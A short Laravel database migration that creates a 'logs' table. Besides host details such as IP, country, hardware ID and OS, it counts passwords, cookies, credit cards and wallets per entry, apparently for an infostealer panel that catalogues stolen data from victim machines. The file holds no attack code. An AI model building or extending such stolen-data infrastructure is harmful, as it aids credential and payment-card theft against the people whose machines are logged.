<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;
use App\Models\User;

return new class extends Migration
{
    /**
     * Run the migrations.
     */
    public function up(): void
    {
        Schema::create('logs', function (Blueprint $table) {
            $table->id();
            $table->string('username');
            $table->string('ip');
            $table->string('country');
            $table->string('user');
            $table->string('hwid');
            $table->string('os');
            $table->date('date');
            $table->integer('password_count')->default(0);
            $table->integer('cookie_count')->default(0);
            $table->integer('cc_count')->default(0);
            $table->integer('wallet_count')->default(0);
            $table->timestamps();
        });
    }

    /**
     * Reverse the migrations.
     */
    public function down(): void
    {
        Schema::dropIfExists('logs');
    }
};
